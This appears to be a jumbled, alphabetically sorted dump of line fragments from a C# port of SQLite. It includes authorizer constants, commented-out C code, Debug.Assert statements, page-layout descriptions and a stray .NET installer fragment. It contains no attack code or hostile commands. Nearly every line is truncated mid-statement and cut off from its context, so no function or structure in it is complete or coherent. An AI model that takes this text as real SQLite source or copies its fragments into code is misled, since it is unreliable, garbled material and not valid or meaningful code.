       SQLITE_CREATE_VIEW
       SQLITE_DELETE
       SQLITE_DROP_INDEX
       SQLITE_DROP_TABLE
       SQLITE_DROP_TEMP_INDEX
       SQLITE_DROP_TEMP_TABLE
       SQLITE_DROP_TEMP_TRIGGER
       SQLITE_DROP_TEMP_VIEW
       SQLITE_DROP_TRIGGER
       SQLITE_DROP_VIEW
       SQLITE_INSERT
       SQLITE_PRAGMA
       SQLITE_READ
       SQLITE_SELECT
       SQLITE_TRANSACTION
       SQLITE_UPDATE
       TEMP => ID 
       TK_EQ              OP_Ne
       TK_GE              OP_Lt
       TK_GT              OP_Le
       TK_ISNULL          OP_NotNull
       TK_LE              OP_Gt
       TK_LT              OP_Ge
       TK_NE              OP_Eq
       TK_NOTNULL         OP_IsNull
       VFS Delegates
       VIEW => ID 
       already been called and returned SQLITE_OK).
       and might be shorter than the value read from (5).  If the first byte
       associated with the source database BtShared structure will always
       b INTEGER CONSTRAINT fk1 REFERENCES ex2(x)
       backup_finish(). Both these functions obtain the source database
       be held when either of these functions are invoked.
       call by X completes.
       cursor number base
       cursor number iCur
       database to during a rollback.
       deleted.
       fewer the better.)
       from malloc.
       handle mutex and the mutex associated with the source BtShared
       if( <full-sync mode> ) xSync(<journal file>)
       index and in the main table.
       invoked by the pager layer to report various state changes in
       is this many bytes in size.
       journal name is stored in UTF-8.
       journal.)
       leafData:  1 if pPage holds key
       max     maximum allowed value of the integer
       memory cell iRowid.
       min     minimum allowed value of the integer
       name.  The value may be zero (indicate that there is no master
       nextC   first character after the integer
       not from 0..nMem-1 
       number of page records from the journal size.
       obtained from sqlite3ParserAlloc.
       of the name is 
       or OP_Variable that does not need to be placed in a
       pExpr.op            op
       pVal    where to write the integers value.
       pagerStress(page X)
       return sqlite3Corrupt()
       sanity checksum.
       specific register.
       the page cache associated with the source database. The mutex
       with the requested lock (i.e. querySharedCacheTableLock() has
       without blocking.
       x IN (SELECT ...)
      %S      Insert the first element of a SrcList
      %T      Insert a token
      %d      Insert an integer
      %fallback ID X Y Z.
      %s      Insert a string
      %z      A string that should be freed after use
      '
      ( 255 < ( nName = sqlite3Strlen30( zFunctionName ) ) ) )
      ( isMainJrnl != 0 
      ( jointype 
      ( nArg < -1 
      ( pBest = new FuncDef() ) != null )
      ( pColl.type != SQLITE_COLL_NOCASE 
      ( pCost.plan.wsFlags 
      ( pOrderBy == null 
      ( pPager.errCode 
      ( sqlite3UpperToLower[z[iOffset 
      ( xFunc != null 
      ( xFunc == null 
      (!p.pBt.autoVacuum) 
      (!p.pBt.incrVacuum) 
      ((pageSize - 1) 
      (_MSC_VER) 
      (a BETWEEN b AND c) AND (a>=b) AND (a<=c)
      (as determined by function subjRequiresPage()).
      (as free-list leaf pages contain no meaningful data). Sometimes
      (dxPC_Destroy)pcache1Destroy      /
      (internal intkey nodes never contain pointers to overflow pages).
      )
      ) )
      -O option since it can result in incorrect output for programs
      ...
      /
      //
      //  
      //   
      //    
      //     
      //      
      //          
      //            
      //                             /
      //           Select standin
      //          aff = SQLITE_AFF_INTEGER
      //          aff = SQLITE_AFF_NONE
      //          aff = SQLITE_AFF_REAL
      //          aff = SQLITE_AFF_TEXT
      //          break
      //        /
      //        goto delmaster_out
      //        h = (h<<8) 
      //        if( h==(('c'<<24)
      //        return p
      //        zIn
      //        }
      //        }else if( (h
      //        }else if( h==(('b'<<24)
      //        }else if( h==(('c'<<24)
      //        }else if( h==(('d'<<24)
      //        }else if( h==(('f'<<24)
      //        }else if( h==(('r'<<24)
      //        }else if( h==(('t'<<24)
      //      /
      //      Debug.Assert( pP4 != null )
      //      GetSystemTimeAsFileTime( ref ft )
      //      UNUSED_PARAMETER( pVfs )
      //      c = zMasterPtr[0] != 0 
      //      ft = System.DateTime.UtcNow.ToFileTime()
      //      goto delmaster_out
      //      if ( c )
      //      if ( rc != SQLITE_OK )
      //      if( n<=db.lookaside.sz ){
      //      if( null==pNew ){
      //      if( pNew ){
      //      int c
      //      int flags = ( SQLITE_OPEN_READONLY 
      //      memcpy(
      //      p.mallocFailed = 1
      //      p.nAlloc = (int)szNew
      //      p.tooBig = 1
      //      p.zText = zNew
      //      public u8 mallocFailed
      //      return
      //      return aff
      //      sqlite3OsClose( pJournal )
      //      sqlite3PageFree(ref hit)
      //      sqlite3StrAccumReset( p )
      //      sqlite3_result_error_nomem(context)
      //      sqlite3_result_error_toobig(context)
      //      string zEnd = pType.z.Substring(pType.n)
      //      timeW = ( ( (sqlite3_int64)ft.dwHighDateTime ) 
      //      va_list ap
      //      while( zIn!=zEnd ){
      //      {
      //      }
      //     amt>0
      //     nMaxCells
      //    //}
      //    Index.Length 
      //    N = p.nAlloc - p.nChar - 1
      //    amt -= wrote
      //    c = ( c << 6 ) 
      //    db.lookaside.pFree = p
      //    else
      //    free(zMulti)
      //    free(zUtf8)
      //    goto delmaster_out
      //    i 
      //    i64 szNew = p.nChar
      //    if ( N <= 0 )
      //    if ( exists )
      //    if ( rc != SQLITE_OK )
      //    if ( szNew > p.mxAlloc )
      //    if ( zNew )
      //    if (p.zText)
      //    if( p==0 ){
      //    if( zErrmsg ){
      //    if( zOut==0 ){
      //    int exists
      //    j 
      //    memcpy(
      //    nByte 
      //    nByteWInfo 
      //    nExtra                       /
      //    nName 
      //    nOut 
      //    p
      //    p = (LookasideSlot
      //    p.pNext = db.lookaside.pFree
      //    p.tooBig = 1
      //    p.zText = sqlite3DbMalloc(p.nChar 
      //    pBuf = 
      //    p[0] = nByte
      //    rc = SQLITE_NOMEM
      //    return 1
      //    return SQLITE_ERROR
      //    return SQLITE_FULL
      //    return SQLITE_NOMEM
      //    sizeof( WhereClause ) 
      //    sizeof( WhereMaskSet )
      //    sizeof( char
      //    sizeof( int ) 
      //    szNew 
      //    u8 
      //    u8.Length 
      //    v = a
      //    zJournal 
      //    zNew = sqlite3DbMalloc( p.nAlloc )
      //    zOld = zOut
      //    zOut[j
      //    {
      //    }
      //    }else{
      //   sz = ROUND8(sz)
      //  (((pMem.flags 
      //  ((pMem.flags 
      //  ((pMem.zMalloc !=null )
      //  ){
      //  /
      //  //sqlite3_free( db.lookaside.pStart )
      //  //sqlite3_free(zPathname)
      //  DWORD error
      //  Debug.Assert( null == zName 
      //  Debug.Assert( sz > sizeof( LookasideSlot
      //  Debug.Assert(pPrior!=0 
      //  GetVersionEx(
      //  LookasideSlot
      //  N -= zSpaces.Length-1
      //  OSVERSIONINFO sInfo
      //  ROUND8(pVfs.szOsFile)   
      //  ROUND8(pcacheSize)      
      //  ROUND8(sizeof(
      //  ROUNDDOWN8(sz)
      //  SQLITE_SKIP_UTF8( ref z)
      //  WCHAR zWidePath[MAX_PATH]
      //  assert( EIGHT_BYTE_ALIGNMENT(SQLITE_INT_TO_PTR(journalFileSize)))
      //  assert( ppStmt!=0 )
      //  attr = GetFileAttributesA( (char
      //  c = sqlite3Utf8Trans1[c - 0xc0]
      //  char
      //  char 
      //  char saveBuf[SAVE_SZ]
      //  char zMbcsPath[MAX_PATH]
      //  db.aExtension = aHandle
      //  db.aExtension[db.nExtension
      //  db.lookaside.bEnabled = 0
      //  db.lookaside.bEnabled = 1
      //  db.lookaside.bMalloced = 0
      //  db.lookaside.bMalloced = pBuf == 0 
      //  db.lookaside.pEnd = 0
      //  db.lookaside.pEnd = p
      //  db.mallocFailed = 1
      //  else
      //  for ( i = cnt - 1 
      //  for ( j = 0 
      //  for(i=0
      //  free(zConverted)
      //  goto append_from_error
      //  goto balance_cleanup
      //  goto exit_create_index
      //  goto exit_drop_index
      //  goto exit_drop_table
      //  goto opendb_out
      //  goto whereBeginError
      //  if ( !p.useMalloc )
      //  if ( !zMasterJournal )
      //  if ( 0==( a
      //  if ( NEVER( pMem->zMalloc ) ) sqlite3VdbeMemRelease( pMem )
      //  if ( c < 0x80
      //  if ( p == null ) return null
      //  if ( rc != SQLITE_OK ) goto delmaster_out
      //  if (compare2pow63(new string(zNum)) < neg) return 1
      //  if (p.useMalloc 
      //  if( 
      //  if( aHandle==null ){
      //  if( aNew==0 ) return
      //  if( db.mallocFailed==0 ){
      //  if( db.nExtension>0 ){
      //  if( p ){
      //  if( pMem->z 
      //  if( pPrior==0 ) return 0
      //  if( pnPage ){
      //  if( pzErrMsg ){
      //  if( rc==INVALID_SET_FILE_POINTER 
      //  if( zConverted==0 ){
      //  if( zMulti ){
      //  if( zStr[i]!=zPattern[0] 
      //  if( zUtf8 ){
      //  int i
      //  int lk
      //  int nMasterPtr = pVfs.mxPathname 
      //  journalFileSize 
      //  memset(
      //  nByte = ROUND8( nByte )
      //  nHeader-(sizeof(aJournalMagic)
      //  nPathname 
      //  neg = 0
      //  neg = 1
      //  p
      //  p = (LookasideSlot
      //  p = (sqlite3_int64
      //  p = new UnpackedRecord()
      //  p = null
      //  p = pSpace
      //  p--
      //  p.aOp = pNew
      //  p.db = db
      //  p.flags = UNPACKED_NEED_FREE 
      //  p.iBatch = 0
      //  p.isSorted = 1
      //  p.nFresh = (u16)((N - ROUND8(sizeof(
      //  p.pChunk = 0
      //  p.pEntry = 0
      //  p.pFresh =(struct RowSetEntry
      //  p.pLast = 0
      //  p.pTree = 0
      //  p.rc = SQLITE_NOMEM
      //  p.zText[p.nChar] = 0
      //  pCheck.mallocFailed = 1
      //  pFile->lastErrno = (u32)GetLastError()
      //  pFile->lastErrno = GetLastError()
      //  pFile->lastErrno = error
      //  pFile->sharedLockByte = (u16)((lk 
      //  pFile.lastErrno = (u32)GetLastError()
      //  pMem.flags = MEM_Null
      //  pMem.z[pMem->n
      //  pMem.z[pMem->n] = 0
      //  pNew = null
      //  pNew = standin
      //  pParse.rc = SQLITE_NOMEM
      //  pPayload = 
      //  pPrior = 
      //  pStart = 0
      //  pStart = pBuf
      //  pStart = sqlite3Malloc( sz 
      //  p[0] = nByte
      //  paCol = null
      //  pnCol = 0
      //  pnErr = 1
      //  pnErr = sCheck.nErr
      //  ptr[0] = ptr[2]
      //  ptr[1] = ptr[3]
      //  r
      //  rc = SQLITE_NOMEM
      //  res = pFile.fs.Lock( SHARED_FIRST 
      //  return
      //  return (void
      //  return 0
      //  return 1
      //  return SQLITE_BUSY
      //  return SQLITE_ERROR
      //  return SQLITE_IOERR
      //  return SQLITE_IOERR_FSTAT
      //  return SQLITE_IOERR_TRUNCATE
      //  return SQLITE_NOMEM
      //  return SQLITE_OK
      //  return WRC_Abort
      //  return compare2pow63(zNum)<neg
      //  return dummy
      //  return null
      //  return pNew
      //  return p[0]
      //  sInfo.dwOSVersionInfoSize = sInfo.Length
      //  sizeof(sqlite3Prng)
      //  sqlite3BeginBenignMalloc()
      //  sqlite3BtreeLeave(p)
      //  sqlite3DeleteTable( ref pTab )
      //  sqlite3EndBenignMalloc()
      //  sqlite3PageFree(ref pFree)
      //  sqlite3StrAccumReset(sCheck.errMsg)
      //  sqlite3_file pFile = (sqlite3_file
      //  sqlite3_file pFile = (sqlite3_file)id
      //  sqlite3_int64 p
      //  sqlite3_int64 p = (sqlite3_int64
      //  sqlite3_os_type = sInfo.dwPlatformId == VER_PLATFORM_WIN32_NT 
      //  sqlite3_query_plan[--nQPlan] = 0
      //  sz = 0
      //  v = v
      //  va_list ap
      //  void 
      //  void pNew = 0
      //  while ( ( 
      //  while ( ( zJournal - zMasterJournal ) < nMasterJournal )
      //  while(
      //  z = sqlite3ErrStr( SQLITE_NOMEM )
      //  z.Append( zMod.Substring( n ).ToLower() )
      //  zBuf[j] = (char)zChars[ ((unsigned char)zBuf[j])%(sizeof(zChars)-1) ]
      //  zBuf[j] = 0
      //  zConverted = utf8ToMbcs(zFilename)
      //  zConverted = utf8ToUnicode(zFilename)
      //  zJournal = zMasterJournal
      //  zMasterJournal = sqlite3Malloc((int)nMasterJournal 
      //  zMasterJournal[nMasterJournal] = 0
      //  zMasterPtr = 
      //  zMulti = unicodeToUtf8(zWidePath)
      //  zNum
      //  zUtf8 = sqlite3_win32_mbcs_to_utf8(zMbcsPath)
      //  {
      //  }
      //  }else{
      // /
      // ALWAYS() and NEVER() are no-op pass-through macros
      // ALWAYS(x) asserts that x is true. NEVER(x) asserts x is false.
      // ALWAYS(x) is a constant 1.  NEVER(x) is a constant 0.
      // CONSTRUCTOR
      // Cannot happen under C
      // Constructor
      // Debug.Assert(
      // Debug.Assert( pPgnoNext)
      // Debug.Assert((char
      // Default Value
      // Do a quick test to prevent the try/catch block
      // Execute the statement
      // Not needed in C
      // Not used in C
      // Not used under c
      // Release additional C
      // Reset the statment so it's ready to use again
      // TODO -- Determine if the following Assert is needed under c
      // TODO -- What do we want to do about this routine
      // TODO --pMem.z = pMem.zMalloc
      // Under C
      // VVA_ONLY( int nRef = sqlite3PagerRefcount(pPager) )
      // We need to create instances of the col cache
      // assert( EIGHT_BYTE_ALIGNMENT(pMem) )
      // for (i = 0
      // if ( result 
      // in order to pick the appropriate locking strategy
      // pH.htsize = new_size = sqlite3MallocSize(new_ht)/sizeof(struct _ht)
      // placeholder method
      // prepare and compile 
      // public HANDLE h
      // sqlite3 db = sqlite3_context_db_handle( context )
      // this is where it needs to check if it's running in an ASP.Net MediumTrust or lower environment
      //( isBtreeCursor 
      //(sqlite3_int64)2000000000 
      //)
      //--------------------------------------------------------------------
      ///
      ////        db.mallocFailed = 1
      ////    if( pzErrMsg !=null){
      //////        db.mallocFailed = 1
      ////Debug.Assert( z<=zTerm )
      ////if ( 0 == db.mallocFailed )
      //2 
      //DWORD error
      //DWORD lowerBits
      //DWORD rc
      //DWORD upperBits
      //Debug.Assert( 0 == db.mallocFailed )
      //Debug.Assert( 1 >=
      //Debug.Assert( EIGHT_BYTE_ALIGNMENT(aSpace1) )
      //Debug.Assert( j
      //Debug.Assert( j<=nOut )
      //Debug.Assert( p.zErrMsg)
      //Debug.Assert( pCell < pPage.aData 
      //Debug.Assert( pEType != 0 )
      //Debug.Assert( pParse.db.mallocFailed == 0 )
      //Debug.Assert( ppBtree != null)
      //Debug.Assert( sizeof(p)==BITVEC_SZ )
      //Debug.Assert( z2 == sqlite3_value_text( argv[0] ) )
      //Debug.Assert( zB == sqlite3_value_text( argv[0] ) )
      //Debug.Assert( zIn == sqlite3_value_text( argv[0] ) )
      //Debug.Assert(N >= ROUND8(sizeof(
      //Debug.Assert(nByte > 0 )
      //GetSystemTime(
      //HANDLE h
      //LONG lowerBits = (LONG)( nByte 
      //LONG lowerBits = (LONG)( offset 
      //LONG upperBits = (LONG)( ( nByte >> 32 ) 
      //LONG upperBits = (LONG)( ( offset >> 32 ) 
      //SYSTEMTIME time
      //SimulateIOError(return SQLITE_IOERR_DELETE)
      //SimulateIOError(return SQLITE_IOERR_FSTAT)
      //SimulateIOError(return SQLITE_IOERR_READ)
      //SimulateIOError(return SQLITE_IOERR_TRUNCATE)
      //TESTONLY( unsigned int nPage = 0
      //VVA_ONLY( int rc
      //VVA_ONLY( rc = ) sqlite3_step(pStmt)
      //VdbeOp pNew
      //a = (unsigned char 
      //aPayload 
      //aPayload = pCur.info.pCell
      //aSpace1 = new byte[pBt.pageSize 
      //assert( (pMem->flags
      //assert( EIGHT_BYTE_ALIGNMENT(
      //assert( EIGHT_BYTE_ALIGNMENT( pMem ) )
      //assert( EIGHT_BYTE_ALIGNMENT(pMem) )
      //assert( EIGHT_BYTE_ALIGNMENT(pPager->jfd) )
      //assert( db!=0 )
      //assert( pzErrMsg!=0 )
      //assert( sqlite3_mutex_held(db->mutex) )
      //b = (unsigned char 
      //c = 
      //char
      //char aff = SQLITE_AFF_NUMERIC
      //char nextC
      //char zTempPath[MAX_PATH
      //const char 
      //const sqlite3_int64 max32BitValue =
      //convertUtf8Filename(zRelative))
      //db.lookaside.pFree = 0
      //db.lookaside.pStart = pStart
      //db.lookaside.sz = (u16)sz
      //db.mallocFailed = 1
      //digit 
      //do
      //dxCallback xCallback
      //else
      //else if ( pBuf == 0 )
      //else if (i > 19)
      //extern int sqlite3_io_error_pending
      //fflush(pOut)
      //fflush(stdout)
      //for ( i = idx 
      //for ( int i = 0 
      //for (i = 0
      //for(i=0
      //for(i=j=0
      //for(i=sqlite3Strlen30(zTempPath)
      //for(i=sqliteHashFirst(
      //for(k=sqliteHashFirst(pSchema.tblHash)
      //for(n=0
      //free(zConverted)
      //i64
      //i64 v = 0
      //if ( !SetEndOfFile( pFile->h ) )
      //if ( ( 
      //if ( ( lowerBits == INVALID_FILE_SIZE )
      //if ( NEVER( db.mallocFailed != 0 ) ) goto exit_rename_table
      //if ( NEVER( mem1.zMalloc ) ) sqlite3VdbeMemRelease( 
      //if ( aXRef == null ) goto update_cleanup
      //if ( c >= 0xc0 )
      //if ( cnt < 0 ) cnt = 0
      //if ( db.lookaside.bMalloced )
      //if ( db.lookaside.nOut )
      //if ( db.mallocFailed != 0 )
      //if ( db.mallocFailed != 0 ) rc = SQLITE_NOMEM
      //if ( isNT() )
      //if ( nByte > szSpace)
      //if ( nMasterJournal > 0 )
      //if ( p )
      //if ( p == null 
      //if ( p.db.mallocFailed != 0 )
      //if ( p.nChar 
      //if ( pI64 )
      //if ( pMask != 0 )
      //if ( pMem.n != 0 
      //if ( pOutFlags )
      //if ( pParse.db.mallocFailed != 0 ) return 0
      //if ( pPg != null )
      //if ( pPgno != 0 )
      //if ( pSrc != null )
      //if ( pStart )
      //if ( pTriggerStep != null )
      //if ( pbMayReplace )
      //if ( rc != SQLITE_OK ) goto delmaster_out
      //if ( rc == INVALID_SET_FILE_POINTER 
      //if ( rc == SQLITE_IOERR_NOMEM ) db.mallocFailed = 1
      //if ( sz <= (int)sizeof( LookasideSlot
      //if ( sz == 0 
      //if (!SystemTimeToFileTime(
      //if (FlushFileBuffers(pFile.h) != 0)
      //if (i < 19)
      //if (isNT())
      //if (negFlag != 0) neg = 1 - neg
      //if (newCell == null) return SQLITE_NOMEM
      //if (p.aColName == 0) return
      //if (p.zText.Length > 0)
      //if (pFree != null)
      //if (pNew != null)
      //if (pzTail != null)
      //if (sqlite3_os_type == 0)
      //if( 
      //if( !aOvflSpace ){
      //if( !p ){
      //if( !pPtr ){
      //if( !sCheck.anRef ){
      //if( N>0 ){
      //if( apCell==null ){
      //if( c!=0 
      //if( db.aDb==db.aDbStatic ){
      //if( hit==null ){
      //if( mem0.alarmCallback==0 ) return
      //if( n<32 ) n = 32
      //if( nOut-1>db->aLimit[SQLITE_LIMIT_LENGTH] ){
      //if( pCheck.errMsg.mallocFailed ){
      //if( pItem==null ){
      //if( pNew==null   ){
      //if( pToCol ){
      //if( sCheck.mallocFailed ){
      //if( sqlite3_temp_directory ){
      //if( xInit==0 ){
      //if( zOut==0 ){
      //if( zStmt==0 ){
      //int (
      //int N
      //int c
      //int error = GetLastError ()
      //int i
      //int iDummy = 0
      //int iSpace1 = 0
      //int loopLimit
      //int max
      //int min
      //int nByte = sizeof(PgHdr1) 
      //int nBytes = KeyInfo.Length 
      //int neg
      //int neg = 0
      //int pVal
      //int r = 0
      //j 
      //j = sqlite3Strlen30(zBuf)
      //k = pBt.pageSize 
      //loopLimit = nStr - nPattern
      //m.zMalloc = null
      //mem0.alarmArg = pArg
      //mem0.alarmCallback = null
      //mem0.alarmCallback = xCallback
      //mem1.zMalloc = null
      //memcpy(
      //memcpy( 
      //memset(
      //memset(z[
      //nByte = ROUND8( sizeof( UnpackedRecord ) ) 
      //nByte = ROUND8(nByte)
      //nByte = sizeof(
      //nByteWInfo = ROUND8( sizeof( WhereInfo ) 
      //nOff = ( 8 - ( SQLITE_PTR_TO_INT( pSpace ) 
      //nowUsed = sqlite3StatusValue(SQLITE_STATUS_MEMORY_USED)
      //object aHandle
      //object oDummy = null
      //object pArg
      //p
      //p = malloc( nByte 
      //p->aMem = pMem = (Mem
      //p.mallocFailed = 0
      //p.zMalloc = null
      //pArg = mem0.alarmArg
      //pCtx.s.db.mallocFailed = 1
      //pFrom.zMalloc=null
      //pIndex.zName = null
      //pLeft = pSrc.a[0]
      //pLevel = pWInfo.a
      //pMaskSet = (WhereMaskSet)pWC[1]
      //pOldItem = p.a
      //pPager.zFilename =    (char
      //pParser = (yyParser
      //pPtr = (u8 
      //pRight = pLeft[1]
      //pSize = (((sqlite3_int64)upperBits)<<32) 
      //pSpace 
      //public int mallocFailed
      //public sqlite3_io_methods pMethods
      //public string z
      //public string zMalloc
      //public u8 mallocFailed
      //ref iDummy ) )
      //register unsigned char 
      //return ( ( rc == INVALID_FILE_ATTRIBUTES )
      //return (void
      //return 0x3fffffff 
      //return 1
      //return UpperToLower[
      //return r
      //return sqlite3_os_type == 2
      //return zConverted
      //sCheck.mallocFailed = 0
      //sizeof( VdbeCursor ) 
      //sqlite3PageFree(ref pBt.pTmpSpace)
      //sqlite3ScratchFree( ref apCell )
      //sqlite3_free( ref  elem )
      //sqlite3_free( ref  pFile )
      //sqlite3_free( ref  pH.ht )
      //sqlite3_free( ref  pMaster )
      //sqlite3_free( ref  pPager )
      //sqlite3_free( ref  pPager.pTmpSpace )
      //sqlite3_free( ref db )
      //sqlite3_free( ref p )
      //sqlite3_free( ref pCache )
      //sqlite3_free( ref pCache.apHash )
      //sqlite3_free( ref pPager.aSavepoint )
      //sqlite3_free( ref pTmpSpace )
      //sqlite3_free( ref pV )
      //sqlite3_free( ref zErr )
      //sqlite3_free(ref p)
      //sqlite3_free(ref pCur.pKey)
      //sqlite3_int64 nowUsed
      //sqlite3_int64 p
      //sqlite3_mutex_enter(mem0.mutex)
      //sqlite3_mutex_leave(mem0.mutex)
      //sqlite3_query_plan[nQPlan] = 0
      //static char zChars[] =
      //string  zConverted
      //string z
      //string z = zIn
      //szScratch =
      //szSpace -= nOff
      //testcase( m.zMalloc != 0 )
      //testcase( nOut-1==db->aLimit[SQLITE_LIMIT_LENGTH] )
      //testcase( nOut-2==db->aLimit[SQLITE_LIMIT_LENGTH] )
      //u32 h = 0
      //u8[] aSpace1
      //u8[] zBuf = new u8[N]
      //va_end( ap )
      //va_list ap
      //void
      //while (
      //while( 
      //while( N>=zSpaces.Length-1 ){
      //while( nQPlan>0 
      //while( sqlite3Isspace(
      //while( zNum[0]=='0' ){ zNum
      //winFile
      //xCallback = mem0.alarmCallback
      //xInit = (int(
      //z 
      //z = (char
      //z = pFKey.aCol[nCol].zCol
      //z = zBuf
      //zBuf[j] = 0
      //zDate
      //zDate 
      //zOut[j] = 0
      //zStart = zNum
      //zStmt = sqlite3Malloc( n )
      //zTempPath[i] = 0
      //z[i] = 0
      //z[n] = 0
      //z[pTo.n] = 0
      //{
      //}
      //}else
      //}else if( 
      //}else if( i<19 ){
      //}else if( isNT() ){
      //}else {
      //}else{
      0
      0                     0            NULL
      0 == memDb 
      1                     1            signed integer
      1       2      byte offset to the first freeblock
      1.  Make sure that cells and freeblocks do not overlap
      10000000 
      2                     2            signed integer
      2     Byte offset of the next freeblock
      2     Bytes in this freeblock
      3                     3            signed integer
      3       2      number of cells on this page
      4                     4            signed integer
      4     First page of the overflow chain.  Omitted if no overflow
      4     Number of leaf pointers on this page
      4     Page number of next overflow page
      4     Page number of next trunk page
      4     Page number of the left child. Omitted if leaf flag is set.
      5                     6            signed integer
      5       2      first byte of the cell content area
      5.  Check the integrity of overflow pages.
      6                     8            signed integer
      6.  Recursively call checkTreePage on all children.
      7                     8            IEEE float
      7       1      number of fragmented free bytes
      7.  Verify that the depth of all children is the same.
      8                     0            Integer constant 0
      8       4      Right child (the Ptr(N) value).  Omitted on leaves.
      8.  Make sure this page is at least 33% full or else it is
      9                     0            Integer constant 1
      <Install>true</Install>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Visible>False</Visible>
      <selectA>  <operator>  <selectB>  ORDER BY <orderbylist>
      A = Y / 100
      A: setup for the SELECT
      ABORT => ID 
      AFTER => ID 
      A[0] = (byte)ac[offset 
      A[1] = (byte)ac[offset 
      A[2] = (byte)ac[offset 
      A[3] = (byte)ac[offset 
      AggInfo pAggInfo = pNC.pAggInfo
      AggInfo sAggInfo
      AggInfo_col pC
      AggInfo_func pF
      AggInfo_func pFunc
      AuthContext sContext
      AutoincInfo p
      AuxData pAuxData
      B = 2 - A 
      B: open temp table
      B: open write cursor to <table> and its indices
      BEGIN => ID 
      BTREE_AUTOVACUUM_INCR
      Bitmask allowed = 
      Bitmask chngToIN
      Bitmask extraRight = 0
      Bitmask indexable
      Bitmask mask = 0
      Bitmask notReady
      Bitmask prereqAll
      Bitmask prereqLeft
      Bitvec p
      Bitvec p = pBt.pHasContent
      Bitvec pBitvec = null
      Bitvec pDone = null
      BtCursor p
      BtCursor pCsr
      BtCursor pCur
      BtCursor pCur = pC.pCursor
      BtLock lock
      BtLock pNext
      BtShared pBt
      BtShared pBt = (BtShared)pArg
      BtShared pBt = null
      BtShared pBt = p.pBt
      BtShared pBt = pCur.pBt
      BtShared pBt = pPage.pBt
      BtShared pBt = pRoot.pBt
      Btree p
      Btree p = pCur.pBtree
      Btree pBtree
      Btree pBtree = pCur.pBtree
      Btree pMain
      Btree pTemp
      C: loop over rows of intermediate table
      C: yield X
      COMMA => nothing 
      CSSQLite.sqlite3_finalize( ref vm )
      CSSQLite.sqlite3_reset( vm )
      CellInfo debuginfo = new CellInfo()
      CellInfo info
      CellInfo info = new CellInfo()
      Cleanup( p )
      CollSeq p
      CollSeq p4
      CollSeq pColl
      CollSeq pColl = null
      CollSeq pColl = sqlite3GetFuncCollSeq( context )
      CollSeq pColl2
      CollSeq pRet
      CollSeq[] pColl
      Column pCol
      Column[] aCol
      Console.Write( zBuf.ToString() )
      CountCtx p = new CountCtx()
      D: ...
      D: cleanup
      DDDD.DD
      DO_OS_MALLOC_TEST( id )
      DO_OS_MALLOC_TEST( null )
      DWORD error = NO_ERROR
      DateTime x
      DateTime x = new DateTime()
      DateTime x = null
      Db aNew = null
      Db pDb
      Db pDb = null
      DbFixer sFix = new DbFixer()
      DbPage pDbPage
      DbPage pDbPage = new PgHdr()
      Debug.Assert(
      Debug.Assert( 
      Debug.Assert(  rc==SQLITE_OK 
      Debug.Assert( !isFatalError( p.rc ) )
      Debug.Assert( !isOpen( pPager.jfd ) 
      Debug.Assert( !isView 
      Debug.Assert( !subjRequiresPage( pPg ) 
      Debug.Assert( ( (u32)nCellKey 
      Debug.Assert( ( MEM_Blob >> 3 ) == MEM_Str )
      Debug.Assert( ( addr >= 0 
      Debug.Assert( ( combined_flags 
      Debug.Assert( ( enc 
      Debug.Assert( ( fg 
      Debug.Assert( ( h >= '0' 
      Debug.Assert( ( isMainJrnl 
      Debug.Assert( ( isSavepnt 
      Debug.Assert( ( offset - c ) < pPager.sectorSize )
      Debug.Assert( ( p.flags 
      Debug.Assert( ( p.selFlags 
      Debug.Assert( ( pFrom.flags 
      Debug.Assert( ( pLevel.plan.wsFlags 
      Debug.Assert( ( pMem.flags 
      Debug.Assert( ( pOrig.flags 
      Debug.Assert( ( pPager.state >= locktype )
      Debug.Assert( ( pPg.flags 
      Debug.Assert( ( pSelect.selFlags 
      Debug.Assert( ( pTerm.wtFlags 
      Debug.Assert( ( pTrigger != null 
      Debug.Assert( ( pUnpacked.flags 
      Debug.Assert( ( pVal.flags 
      Debug.Assert( ( ppLast ).pRight == null )
      Debug.Assert( ( rc 
      Debug.Assert( ( wctrlFlags 
      Debug.Assert( /
      Debug.Assert( //db.mallocFailed != 0 
      Debug.Assert( 0 == ( flags 
      Debug.Assert( 0 == db.init.busy 
      Debug.Assert( 0 == pPager.setMaster )
      Debug.Assert( N > 0 )
      Debug.Assert( PAGER_EXCLUSIVE == EXCLUSIVE_LOCK )
      Debug.Assert( PAGER_JOURNALMODE_QUERY < 0 )
      Debug.Assert( PAGER_LOCKINGMODE_EXCLUSIVE == 1 )
      Debug.Assert( PAGER_LOCKINGMODE_NORMAL >= 0 
      Debug.Assert( PAGER_LOCKINGMODE_QUERY < 0 )
      Debug.Assert( PAGER_RESERVED == RESERVED_LOCK )
      Debug.Assert( PAGER_SHARED == SHARED_LOCK )
      Debug.Assert( SQLITE_UTF8 == 1 
      Debug.Assert( TK_GE == TK_EQ 
      Debug.Assert( TK_GT > TK_EQ 
      Debug.Assert( TK_LE > TK_EQ 
      Debug.Assert( TK_LT > TK_EQ 
      Debug.Assert( a != null )
      Debug.Assert( aData != null )
      Debug.Assert( addr < p.nOp )
      Debug.Assert( addr >= 0 )
      Debug.Assert( allowedOp( op ) )
      Debug.Assert( allowedOp( pExpr.op ) 
      Debug.Assert( amt > 0 )
      Debug.Assert( argc <= 1 )
      Debug.Assert( argc == 1 
      Debug.Assert( argc == 1 )
      Debug.Assert( argc == 2 )
      Debug.Assert( argc == 3 
      Debug.Assert( argc == 3 )
      Debug.Assert( argc > 1 )
      Debug.Assert( assert_pager_state( pPager ) )
      Debug.Assert( b.rc != SQLITE_OK )
      Debug.Assert( cnt == db.activeVdbeCnt )
      Debug.Assert( count >= 0 )
      Debug.Assert( createFlag == 1 
      Debug.Assert( cursorHoldsMutex( pCur ) )
      Debug.Assert( db != null )
      Debug.Assert( db == null 
      Debug.Assert( db.aDb[0].Equals( db.aDbStatic[0] ) )
      Debug.Assert( db.aDb[iDb].pBt != null )
      Debug.Assert( db.aDb[iDb].pSchema != null )
      Debug.Assert( db.aLimit.Length == aHardLimit.Length )
      Debug.Assert( db.activeVdbeCnt > 0 
      Debug.Assert( db.init.busy != 0 )
      Debug.Assert( db.init.busy == 0 
      Debug.Assert( db.lookaside.bEnabled == 0 )
      Debug.Assert( db.lookaside.nOut == 0 )
      Debug.Assert( db.magic == SQLITE_MAGIC_BUSY )
      Debug.Assert( db.nDb <= 2 )
      Debug.Assert( db.nDb > iDb )
      Debug.Assert( db.pDfltColl != null )
      Debug.Assert( db.u1.isInterrupted )
      Debug.Assert( db.xCollNeeded == null 
      Debug.Assert( desiredEnc == SQLITE_UTF8 
